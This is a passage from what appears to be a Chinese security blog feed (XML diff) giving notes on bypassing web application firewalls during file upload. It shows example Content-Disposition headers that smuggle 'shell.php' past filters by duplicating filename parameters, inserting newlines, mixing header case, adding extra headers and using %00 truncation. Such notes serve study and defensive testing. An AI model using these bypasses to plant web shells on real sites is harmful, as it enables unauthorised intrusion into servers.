+<p>这里并没有进行复现，只是可能进行绕过的一些思路</p>
+<h3 id="增加Content-Disposition字段长度"><a href="#增加Content-Disposition字段长度" class="headerlink" title="增加Content-Disposition字段长度"></a>增加Content-Disposition字段长度</h3><blockquote>
+<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。</p>
+<p>在  multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart  消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
+<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
+</blockquote>
+<h3 id="对文件名进行修改"><a href="#对文件名进行修改" class="headerlink" title="对文件名进行修改"></a>对文件名进行修改</h3><ol>
+<li>去除filename=”shell.php”中的双引号或是修改为单引号，扰乱匹配</li>
+<li>因为文件在上传时接收的是最后一个文件，那么尝试在这之前加一些干扰的filename参数</li>
+</ol>
+<blockquote>
+<p>Content-Disposition: form-data; name=”file”; filename=1.jpg;  filename=”shell.php”</p>
+</blockquote>
+<ol>
+<li>当是对所有的filename进行检测时，尝试将前面的filename去掉</li>
+</ol>
+<blockquote>
+<p>Content-Disposition: form-data; name=”file”; filename= ;  filename=”shell.php”</p>
+</blockquote>
+<h3 id="在文件名中间加符号扰乱匹配，如"><a href="#在文件名中间加符号扰乱匹配，如" class="headerlink" title="在文件名中间加符号扰乱匹配，如"></a>在文件名中间加符号扰乱匹配，如</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">&#39;</span><br><span class="line"> (空格)</span><br></pre></td></tr></table></figure>
+<h3 id="对filename动手脚"><a href="#对filename动手脚" class="headerlink" title="对filename动手脚"></a>对filename动手脚</h3><blockquote>
+<p>让waf对filename这个字符串匹配不到，但是服务器又可以接收，加入换行这类的干扰</p>
+</blockquote>
+<h4 id="可能的绕过"><a href="#可能的绕过" class="headerlink" title="可能的绕过"></a>可能的绕过</h4><ol>
+<li>对文件名中的每个字符进行换行</li>
+<li>切断filename=和之后的值（换行）</li>
+<li>文件名换行，就是在HEX中加入0a</li>
+</ol>
+<h3 id="修改匹配字段"><a href="#修改匹配字段" class="headerlink" title="修改匹配字段"></a>修改匹配字段</h3><blockquote>
+<p>filename参数是在post包中的 Content-Disposition 字段，那么waf也是先匹配到这个http头在对内容进行检测，我们可以尝试对这个头的特征进行修改</p>
+<p>我们尝试去掉这个form-data   (form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)</p>
+</blockquote>
+<ol>
+<li>去掉form-data</li>
+<li>对Content-Disposition 字段进行参数污染、Content-Disposition大小写混淆</li>
+</ol>
+<blockquote>
+<p>Content-Disposition 字段参数污染</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537709838-cca051af-9c06-47ed-afb8-bc4fa3a77a03.png" alt="image.png"></p>
+<ol>
+<li>添加额外的Content-Type字段</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537878758-5e4a903f-245e-4d4d-b8c0-483ac68a0bde.png" alt="image.png"></p>
+<ol>
+<li>添加额外的filename进行参数污染</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537967923-04649433-fbab-4386-8491-0b0b08e35ed6.png" alt="image.png"></p>
+<ol>
+<li>添加额外的Content-Length头</li>
+</ol>
+<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h3><blockquote>
+<p>就是将filename=处添加多个等号</p>
+</blockquote>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
+<p>产生的原因是0x00为十六进制表示法，ASCII码里就为0，有些函数在处理时会将其当做结束符；当url中出现%00会认为读取已经结束</p>
+</blockquote>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[文件上传Bypass安全狗 ](</p>
+<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
+<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
+<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
+<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
   </entry>
   <entry>
     <title></title>
